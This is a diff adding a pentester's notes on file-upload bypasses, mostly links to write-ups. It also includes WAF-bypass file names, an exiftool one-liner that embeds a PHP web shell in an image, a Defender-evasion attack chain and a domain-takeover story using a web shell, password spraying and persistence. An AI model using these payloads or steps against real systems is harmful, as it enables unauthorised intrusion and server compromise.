@@ -1569,3 +1569,218 @@ Wayback Machine
 
 https://link.medium.com/U7fDCY1W3tb
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+WAF bypass during exploitation
+of file upload
+/?flle=rce.php<-- Blocked
+/?flle=rce.php.jpg <-- Blocked
+/?flle=rce.php5 <-- Blocked
+/?file===rce.php <-- Bypassed 200 0K
+
+
+
+
+
+
+
+Web app run with Microsoft
+With fuzzing found endpoint allow to upload jpg
+file
+
+bypass was cmd.jpg.aspx
+Akamai blocked me
+bypassed cmd.jpg.aspx.
+
+Aspx[dot]
+
+
+
+
+
+
+https://tryhackme.com/room/uploadvulns
+
+https://www.linkedin.com/pulse/bypass-file-upload-restriction-jquery-uploadifive-kermelis?trackingId=tRi1gMMCSNKPPjFebOTWvw%3D%3D
+
+
+https://lnkd.in/gyfhmcNr
+
+https://youtu.be/GdWZPCJ4Smw
+
+https://www.linkedin.com/pulse/bypass-file-upload-methods-shayan-akbari?trackingId=URqIvsmZSsSVEseZCLmuSQ%3D%3D
+
+
+https://doepichack.com/simple-svg-file-upload-bypass-for-1500/
+
+https://lnkd.in/dqwrq6Cb
+
+https://lnkd.in/d_Fr8-Xj
+
+
+
+
+
+Bypass File Upload Filtering :
+
+In image :
+
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
+
+mv shell.jpg shell.php.jpg
+
+
+
+
+
+
+
+
+https://medium.com/@madhuhack01/insecure-file-upload-basic-bypass-76d1b9197e4c
+
+Hello ppl !!!!!!!!!!!
+
+Read my first blog 🎉 on medium about "Insecure File upload basic bypass Technique and How to Exploit it"
+https://lnkd.in/gATSrzqB
+
+
+
+
+
+
+
+
+
+https://medium.com/@h4x0r_dz/23000-for-authentication-bypass-file-upload-arbitrary-file-overwrite-2578b730a5f8
+Authentication Bypass & File Upload & Arbitrary File Overwrite
+
+https://lnkd.in/dHAJqxhq
+
+
+
+
+
+
+
+
+File uploads are a common feature in web applications. However, they can be vulnerable to several types of bugs such as Remote Code Execution, Unrestricted File Upload, File Overwrite Attack, Path Traversal Attack, Large File Denial of Service, Server-Side Injection Attack, Metadata Leakage and ImageTragik Attack.
+Some of them Which I LOVE :
+1. RCE via File Upload
+2. XSS via Filename
+3. XSS via Metadata
+4. XSS via SVG file
+5. Blind XSS via SVG
+6.SSRF via Filename
+7.SSRF via SVG Upload
+8.SSRF via Iframe in Html
+9.XXE via File Upload
+10.CSRF on File Upload
+11.Exif MetaData Leakage
+12.OpenRedirect via SVG File Upload
+13.Large File DOS
+14.File Upload Bypass
+15.File Name Vulnerability
+16.Pixel Flood Attack
+17.CSV Injection
+
+
+
+
+
+
+
+https://bepractical.tech/file-upload-vulnerabilities-2-filter-bypass/
+Hi everyone! I have just written another article on "Different Ways to Bypass File Upload Filters"
+
+Check it out: https://lnkd.in/dDFfCTUx
+
+
+
+
+
+
+
+
+White Oak Security discovered an instance of Gladinet’s CentreStack server which was vulnerable to an authentication bypass and an arbitrary file upload resulting in remote code execution.
+https://lnkd.in/g4gzpZ4N
+
+
+
+
+
+
+
+
+
+Red Teaming: Adversary Simulation 
+Bypassing Windows Defender 💻 ☢
+
+Attack chain: .vbs ➡ .cmd ➡ .dll [Payload] ↔ C2
+
+Some notable methods used are:
+➡ Process injection
+➡ Direct syscalls and Nt APIs
+➡ Memory encryption
+
+In this video, I wanted to demonstrate the above mentioned functionality of manual process injection in combination with other techniques being used in a practical attack scenario. Although a VBScript file is used for initial execution, this can be any other file depending on the AV/EDR being used on the machine.
+
+Direct syscall and Nt APIs both are used depending on the options provided with the commands being used. Also, in order to use direct syscalls the retrieve method is used to retrieve all the SSNs for the required APIs at runtime. The SSNs can be retrieved from a new process or the current process, depending on the option specified with the command.
+
+The implant also uses manual PE parsing to retrieve API address, section address, resources etc.
+
+The custom C2 is used as an initial C2 that can be used to execute other implants for C2 frameworks like metasploit as demonstrated in this video. Furthermore, multiple payloads can be uploaded at runtime to execute in memory, avoiding any kind of disk detection.
+
+The injected payloads are protected from initial detection during calls for thread creation as Windows Defender does catch kernel events on thread and process creation and does not use any API hooks.
+
+Youtube: https://lnkd.in/dmXvnyJv
+
+
+
+
+
+
+
+
+
+
+Hi everyone! I've created a new video on bypassing file uploads in modern application that could result in numerous vulnerabilities like remote code execution, cross site scripting and more.
+
+Check it out: https://lnkd.in/diwNTwRP
+
+
+
+
+
+
+
+
+
+https://github.com/antonioCoco/SharPyShell
+🔥An Easy DC Story for example.com🔥
+[Note-down the tools]
+
+1. A web application with a file upload feature
+2. Uploaded WebShell - https://lnkd.in/d35yhGyj
+3. The application was using a service account.
+4. EFS Potato Privilege Escalation: https://lnkd.in/dKcj2ktE.
+5. DMZ bypass with webshell to SOCKS tunneling.- https://lnkd.in/dj2UTNBB
+6. DomainPassword Spray with crackmapexec (Example@1234): https://lnkd.in/dSTVPQ46
+7. Domain Admin Password Reveled ;)
+8. PrivateVPN installation for the persistence.
+
+Sometimes, thinking simply can reveal sensitive information.
+Red Team Tip:
+Consider the target as a coconut.
+Once you break the shell.
+It's all juice and cream for you.
